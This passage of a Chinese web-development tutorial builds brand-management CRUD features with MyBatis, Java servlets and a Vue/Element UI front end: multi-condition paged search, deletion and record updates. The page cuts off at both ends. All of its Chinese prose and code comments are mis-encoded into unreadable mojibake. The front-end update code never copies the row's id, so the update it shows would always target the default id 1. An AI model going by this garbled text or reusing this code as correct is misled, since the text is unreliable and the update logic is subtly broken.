class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                    <span class="hljs-comment">// è·å–æ•°æ®   &#123;rows: &#123; &#125;,totalCount:47&#125;</span>                    <span class="hljs-keyword">var</span> brandlist = response.data.rows;                    <span class="hljs-comment">// è®¾ç½®è¡¨æ ¼æ•°æ®</span>                    _this.brandlist = brandlist;                    <span class="hljs-comment">// è®¾ç½®æ€»è®°å½•æ•°</span>                    _this.totalCount = response.data.totalCount;                &#125;)            &#125;,</code></pre><h3 id="5-å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢"><a href="#5-å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢" class="headerlink" title="5.å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢"></a>5.å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢</h3><h4 id="éœ€æ±‚åˆ†æ-4"><a href="#éœ€æ±‚åˆ†æ-4" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>ç”¨æˆ·æäº¤æ•°æ® çŠ¶æ€ å“ç‰Œåç§° ä¼ä¸šåç§°ï¼Œ ç»‘å®šåˆ°brandæ¨¡å‹åä½œä¸ºå‚æ•°æäº¤ä¸ºåç«¯</li><li>ä¸‰ä¸ªæ¡ä»¶çš„æŸ¥è¯¢ä¸ºandå…³ç³»ï¼Œå¹¶ä¸”å¯¹å“ç‰Œå’Œä¼ä¸šçš„æŸ¥è¯¢éœ€è¦ä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢å³éœ€è¦likeå…³é”®å­—</li><li>æŸ¥è¯¢åä¾ç„¶éœ€è¦åˆ†é¡µæ˜¾ç¤ºï¼Œå› æ­¤éœ€è¦è¿”å›ç¬¦åˆæ¡ä»¶çš„æ•°æ®å¤–ï¼Œè¿˜è¦è¿”å›å¯¹åº”çš„æ•°é‡</li><li>å¯ä»¥æ ¹æ®åˆ†é¡µæŸ¥è¯¢ä¿®æ”¹ä»£ç </li></ul><h4 id="åç«¯å®ç°-4"><a href="#åç«¯å®ç°-4" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-4"><a href="#dao-4" class="headerlink" title="dao"></a>dao</h5><p>éœ€è¦ä¸¤ä¸ªæŸ¥è¯¢ï¼Œ<code>selelctByConditions</code>å’Œ<code>selectByConditionsCount</code></p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * å¤šæ¡ä»¶æŸ¥è¯¢</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectByConditions</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;brand&quot;)</span> Brand brand, <span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-keyword">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-keyword">int</span> size)</span></span>;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å¤šæ¡ä»¶æŸ¥è¯¢çš„è®°å½•æ¡æ•°</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">selectByConditionsCount</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre><p>åœ¨å¯¹åº”çš„<code>BrandMapper.xml</code>ä¸­å®ç°å…·ä½“çš„æŸ¥è¯¢</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditions&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.itheima.pojo.Brand&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span>&gt;</span>    select * from tb_brand    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>        <span class="hljs-comment">&lt;!--è¿™é‡Œæœ‰å¤šä¸ªå‚æ•°ï¼Œè®¿é—®brandæ•°æ®å®æ—¶éœ€è¦ä½¿ç”¨brand.brandName--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;</span>&gt;</span>            and brand_name like #&#123;brand.brandName&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;</span>&gt;</span>            and company_name like #&#123;brand.companyName&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.status != null&quot;</span>&gt;</span>            and status = #&#123;brand.status&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>    limit #&#123;begin&#125;, #&#123;size&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionsCount&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span>    select count(*) from tb_brand    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>         <span class="hljs-comment">&lt;!--è¿™é‡Œä¸ºå•ä¸ªå‚æ•°ï¼Œè®¿é—®brandæ•°æ®å®æ—¶éœ€è¦ä½¿ç”¨#&#123;brandName&#125;--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brandName != null and brandName != &#x27;&#x27;&quot;</span>&gt;</span>            and brand_name like #&#123;brandName&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;companyName != null and companyName != &#x27;&#x27;&quot;</span>&gt;</span>            and company_name like #&#123;companyName&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>            and status = #&#123;status&#125;        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre><h5 id="service-4"><a href="#service-4" class="headerlink" title="service"></a>service</h5><p>åœ¨<code>BrandService</code>ä¸­å®ç°å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢çš„ä¸šåŠ¡é€»è¾‘</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment">   * å¤šæ¡ä»¶åˆ†é¡µæŸ¥è¯¢</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span><span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">   */</span>  <span class="hljs-function"><span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title">selectByConditionsPage</span><span class="hljs-params">(Brand brand, <span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;      SqlSession sqlSession = sqlSessionFactory.openSession();      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);      <span class="hljs-keyword">int</span> begin = (currentPage - <span class="hljs-number">1</span>) * pageSize;      <span class="hljs-keyword">int</span> size = pageSize;      <span class="hljs-comment">// å¯¹æ•°æ®è¿›è¡Œå¤„ç†åŠ ä¸Š % æ¨¡ç³ŠæŸ¥è¯¢è¡¨è¾¾å¼</span>      <span class="hljs-keyword">if</span>(brand.getBrandName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getBrandName().length() &gt; <span class="hljs-number">0</span> )&#123;          brand.setBrandName(<span class="hljs-string">&quot;%&quot;</span> + brand.getBrandName() + <span class="hljs-string">&quot;%&quot;</span>);      &#125;      <span class="hljs-keyword">if</span>(brand.getCompanyName() != <span class="hljs-keyword">null</span> &amp;&amp; brand.getCompanyName().length() &gt; <span class="hljs-number">0</span>)&#123;          brand.setCompanyName(<span class="hljs-string">&quot;%&quot;</span> + brand.getCompanyName() + <span class="hljs-string">&quot;%&quot;</span>);      &#125;      System.out.println(brand);      List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size);      <span class="hljs-keyword">int</span> totalCount = mapper.selectByConditionsCount(brand);      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> PageBean&lt;&gt;();      pageBean.setRows(rows);      pageBean.setTotalCount(totalCount);      sqlSession.close();      <span class="hljs-keyword">return</span> pageBean;  &#125;</code></pre><h5 id="servlet-4"><a href="#servlet-4" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æœç´¢</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;    <span class="hljs-comment">// 1.è·å–å½“å‰é¡µç å’Œæ¯é¡µå±•ç¤ºæ¡æ•° url?currentpage=1&amp;pagesize=5</span>    String _currentpage = request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);    String _pagesize = request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);    <span class="hljs-keyword">int</span> currentpage = Integer.parseInt(_currentpage);    <span class="hljs-keyword">int</span> pagesize = Integer.parseInt(_pagesize);    <span class="hljs-comment">// 2.è·å–jsonå­—ç¬¦ä¸²</span>    BufferedReader reader = request.getReader();    String line = reader.readLine();    System.out.println(line);    <span class="hljs-comment">// 3.å°†jsonå­—ç¬¦ä¸²è½¬ä¸ºbrandå¯¹è±¡</span>    Brand brand = JSON.parseObject(line, Brand.class);    System.out.println(brand);    <span class="hljs-comment">// 4.è°ƒç”¨serviceæ–¹æ³• è·å–pageBeanå¯¹è±¡</span>    PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize);    <span class="hljs-comment">// 5.å°†PageBeanè½¬ä¸ºJsonå­—ç¬¦ä¸²</span>    String string = JSON.toJSONString(pageBean);    <span class="hljs-comment">// 6.å‘é€å“åº”æ•°æ®</span>    response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);    response.getWriter().write(string);&#125;</code></pre><h4 id="å‰ç«¯å®ç°-4"><a href="#å‰ç«¯å®ç°-4" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="è·å–æŸ¥è¯¢æ¡ä»¶"><a href="#è·å–æŸ¥è¯¢æ¡ä»¶" class="headerlink" title="è·å–æŸ¥è¯¢æ¡ä»¶"></a>è·å–æŸ¥è¯¢æ¡ä»¶</h5><p>æŸ¥è¯¢è¡¨å•ç»‘å®šçš„æ¨¡å‹ä¸º<code>searchBrand</code></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">:inline</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">&quot;searchBrand&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo-form-inline&quot;</span>&gt;</span></code></pre><p><code>searchBrand</code>æ•°æ®å¦‚ä¸‹</p><pre><code class="hljs js"><span class="hljs-comment">// æœç´¢æ•°æ®</span>             searchBrand:&#123;                 status: <span class="hljs-string">&#x27;&#x27;</span>,                 brandName: <span class="hljs-string">&#x27;&#x27;</span>,                 companyName: <span class="hljs-string">&#x27;&#x27;</span>,                 id:<span class="hljs-string">&quot;&quot;</span>,                 ordered:<span class="hljs-string">&quot;&quot;</span>,                 description:<span class="hljs-string">&quot;&quot;</span>             &#125;,</code></pre><p>å½“ç”¨æˆ·è¾“å…¥æ¡ä»¶åï¼Œæ•°æ®è‡ªåŠ¨ç»‘å®šåˆ°<code>searchBrand</code>æ¨¡å‹ä¸Šï¼Œå‘åå°æäº¤æ•°æ®æ—¶ï¼Œæäº¤<code>searchBrand</code>å³å¯</p><h5 id="æŸ¥è¯¢çš„å¼‚æ­¥è¯·æ±‚"><a href="#æŸ¥è¯¢çš„å¼‚æ­¥è¯·æ±‚" class="headerlink" title="æŸ¥è¯¢çš„å¼‚æ­¥è¯·æ±‚"></a>æŸ¥è¯¢çš„å¼‚æ­¥è¯·æ±‚</h5><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span>&#123;           <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;           axios(&#123;               method: <span class="hljs-string">&#x27;POST&#x27;</span>,               url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;</span>+ _this.currentPage + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.pageSize,               data: <span class="hljs-built_in">this</span>.searchBrand           &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                   <span class="hljs-comment">// è·å–æ•°æ®   &#123;rows: &#123; &#125; &#125;</span>                   <span class="hljs-comment">// è®¾ç½®è¡¨æ ¼æ•°æ®</span>                   _this.brandlist = response.data.rows;                   <span class="hljs-comment">// è®¾ç½®æ€»è®°å½•æ•°</span>                   _this.totalCount = response.data.totalCount;                   _this.currentPage = <span class="hljs-number">1</span>;           &#125;)       &#125;</code></pre><h3 id="6-åˆ é™¤å•æ¡æ•°æ®"><a href="#6-åˆ é™¤å•æ¡æ•°æ®" class="headerlink" title="6.åˆ é™¤å•æ¡æ•°æ®"></a>6.åˆ é™¤å•æ¡æ•°æ®</h3><h4 id="éœ€æ±‚åˆ†æ-5"><a href="#éœ€æ±‚åˆ†æ-5" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>åˆ é™¤å•æ¡æ•°æ®æ—¶éœ€è¦æºå¸¦è¯¥æ•°æ®çš„idï¼Œä½¿ç”¨getè¯·æ±‚æ—¢å¯</li><li>è·å–idï¼Œå¯ä»¥ä½¿ç”¨<code>scope.row.id</code></li></ul><h4 id="åç«¯å®ç°-5"><a href="#åç«¯å®ç°-5" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-5"><a href="#dao-5" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * åˆ é™¤æŒ‡å®šå•†å“</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-keyword">int</span> id)</span></span>;</code></pre><h5 id="service-5"><a href="#service-5" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * åˆ é™¤æŒ‡å®šæ•°æ®</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>&#123;    SqlSession sqlSession = sqlSessionFactory.openSession();    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);    mapper.deleteById(id);    sqlSession.commit();    sqlSession.close();&#125;</code></pre><h5 id="servlet-5"><a href="#servlet-5" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * åˆ é™¤æŒ‡å®šæ•°æ®</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;    String _id = request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);    <span class="hljs-keyword">int</span> id = Integer.parseInt(_id);    service.deleteById(id);    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);&#125;</code></pre><h4 id="å‰ç«¯å®ç°-5"><a href="#å‰ç«¯å®ç°-5" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="è·å–id"><a href="#è·å–id" class="headerlink" title="è·å–id"></a>è·å–id</h5><p><a href="https://blog.csdn.net/tg928600774/article/details/81945140">å‚è€ƒ</a></p><p>åœ¨ä¿®æ”¹å’Œåˆ é™¤æŒ‰é’®ä½ç½®æ·»åŠ <code>slot-scope=&quot;scope&quot;</code></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>ä¿®æ”¹<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteById(scope.row.id)&quot;</span> &gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></code></pre><p>ä½¿ç”¨<code>scope.row.id</code>å³å¯è·å–åˆ°æ¯è¡Œæ•°æ®çš„id</p><h5 id="å¼‚æ­¥è¯·æ±‚"><a href="#å¼‚æ­¥è¯·æ±‚" class="headerlink" title="å¼‚æ­¥è¯·æ±‚"></a>å¼‚æ­¥è¯·æ±‚</h5><p>åŒæ ·ä½¿ç”¨confirmç»„ä»¶æç¤ºç”¨æˆ·æ˜¯å¦çœŸçš„æƒ³åˆ é™¤</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteById</span>(<span class="hljs-params">id</span>)</span>&#123;             <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;</span>, <span class="hljs-string">&#x27;ç¡®è®¤ä¿¡æ¯&#x27;</span>, &#123;                 distinguishCancelAndClose: <span class="hljs-literal">true</span>,                 confirmButtonText: <span class="hljs-string">&#x27;ç¡®å®š&#x27;</span>,                 cancelButtonText: <span class="hljs-string">&#x27;å–æ¶ˆ&#x27;</span>             &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;                 <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>                 <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;                 <span class="hljs-keyword">var</span> deleteId = id;                 axios(&#123;                     method: <span class="hljs-string">&#x27;get&#x27;</span>,                     url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;</span>+deleteId,                 &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;                     <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;                         <span class="hljs-comment">// é‡æ–°æŸ¥è¯¢æ•°æ®</span>                         _this.selectAll();                         <span class="hljs-comment">//æ˜¾ç¤ºæç¤ºæ¡†</span>                         _this.$message(&#123;                             type: <span class="hljs-string">&#x27;success&#x27;</span>,                             message: <span class="hljs-string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span>                         &#125;);                     &#125;                 &#125;)             &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;                 <span class="hljs-built_in">this</span>.$message(&#123;                     type: <span class="hljs-string">&#x27;info&#x27;</span>,                     message: <span class="hljs-string">&quot;å–æ¶ˆåˆ é™¤&quot;</span>                 &#125;)             &#125;)         &#125;,</code></pre><h3 id="7-ä¿®æ”¹"><a href="#7-ä¿®æ”¹" class="headerlink" title="7.ä¿®æ”¹"></a>7.ä¿®æ”¹</h3><h4 id="éœ€æ±‚åˆ†æ-6"><a href="#éœ€æ±‚åˆ†æ-6" class="headerlink" title="éœ€æ±‚åˆ†æ"></a>éœ€æ±‚åˆ†æ</h4><ul><li>ä¿®æ”¹ä¸æ·»åŠ ç±»ä¼¼ï¼Œéœ€è¦å¼¹å‡ºå¯¹è¯æ¡†åè¿›è¡Œæ•°æ®çš„ç¼–è¾‘</li><li>å¦‚ä½•è·å–æ¯è¡Œçš„æ•°æ®ï¼Œä½¿ç”¨<code>scope.row</code>å³å¯</li><li>è¯·æ±‚æ•°æ®ä¸ºjsonæ•°æ®ï¼Œåå°æ¥æ”¶åå°†å…¶è½¬æ¢ä¸ºBrandç±»å‹åè¿›è¡Œæ›´æ–°æ“ä½œ</li></ul><h4 id="åç«¯å®ç°-6"><a href="#åç«¯å®ç°-6" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-6"><a href="#dao-6" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ›´æ–°æ•°æ®</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;)</span><span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre><h5 id="service-6"><a href="#service-6" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ›´æ–°æ•°æ®</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>&#123;    SqlSession sqlSession = sqlSessionFactory.openSession();    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);    mapper.update(brand);    sqlSession.commit();    sqlSession.close();&#125;</code></pre><h5 id="servlet-6"><a href="#servlet-6" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ›´æ–°</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;    BufferedReader reader = request.getReader();    String line = reader.readLine();    System.out.println(line);    Brand brand = JSON.parseObject(line, Brand.class);    System.out.println(brand);    service.update(brand);    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);&#125;</code></pre><h4 id="å‰ç«¯å®ç°-6"><a href="#å‰ç«¯å®ç°-6" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><h5 id="ä¿®æ”¹å¯¹è¯æ¡†"><a href="#ä¿®æ”¹å¯¹è¯æ¡†" class="headerlink" title="ä¿®æ”¹å¯¹è¯æ¡†"></a>ä¿®æ”¹å¯¹è¯æ¡†</h5><p>è¯¥å¯¹è¯æ¡†ä¸å¢åŠ å¯¹è¯çš„å®ç°ç›¸åŒï¼Œä¸è¿‡è¯¥å¯¹è¯æ¡†åˆå§‹æ—¶éœ€è¦æ˜¾ç¤ºæ•°æ®</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>ä¿®æ”¹<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre><p>updateå‡½æ•°çš„å®ç°</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">update</span>(<span class="hljs-params">data</span>)</span>&#123;              <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;              <span class="hljs-built_in">this</span>.dialogUpdateVisible = <span class="hljs-literal">true</span>;              <span class="hljs-built_in">this</span>.updateBrand.brandName = data.brandName;              <span class="hljs-built_in">this</span>.updateBrand.companyName = data.companyName;              <span class="hljs-built_in">this</span>.updateBrand.status = data.status;              <span class="hljs-built_in">this</span>.updateBrand.ordered = data.ordered;              <span class="hljs-built_in">this</span>.updateBrand.description = data.description;              <span class="hljs-built_in">this</span>.updateBrand.statusStr = data.statusStr;          &#125;,</code></pre><p>updateBrandå®šä¹‰</p><pre><code class="hljs java">data() &#123;           <span class="hljs-keyword">return</span> &#123;               <span class="hljs-comment">//å¸¦ä¿®æ”¹çš„æ•°æ®</span>               updateBrand:&#123;                   <span class="hljs-string">&quot;brandName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,                   <span class="hljs-string">&quot;companyName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,                   <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,                   <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,                   <span class="hljs-string">&quot;ordered&quot;</span>: <span class="hljs-number">0</span>,                   <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-number">0</span>,                   <span class="hljs-string">&quot;statusStr&quot;</span>: <span class="hljs-string">&quot;&quot;</span>               &#125;,   &#125;</code></pre><h5 id="å¼‚æ­¥è¯·æ±‚å®ç°"><a href="#å¼‚æ­¥è¯·æ±‚å®ç°" class="headerlink" title="å¼‚æ­¥è¯·æ±‚å®ç°"></a>å¼‚æ­¥è¯·æ±‚å®ç°</h5><p>ä¿®æ”¹å¯¹è¯æ¡†çš„æäº¤æŒ‰é’®ä½ç½®</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateSubmit&quot;</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>    <span class="hljs-comment">&lt;!--å–æ¶ˆ åªéœ€è¦å°†dialogVisbleè®¾ç½®ä¸ºfalseå³å¯éšè—å¯¹è¯æ¡†--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogUpdateVisible = false&quot;</span>&gt;</span>å–æ¶ˆ<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></code></pre><pre><code class="hljs js"><span class="hljs-comment">// ä¿®æ”¹</span><span class="hljs-function"><span class="hljs-title">updateSubmit</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;    axios(&#123;        method:<span class="hljs-string">&#x27;POST&#x27;</span>,        url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/update&#x27;</span>,        data: _this.updateBrand    &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;        <span class="hljs-keyword">if</span>(response.data == <span 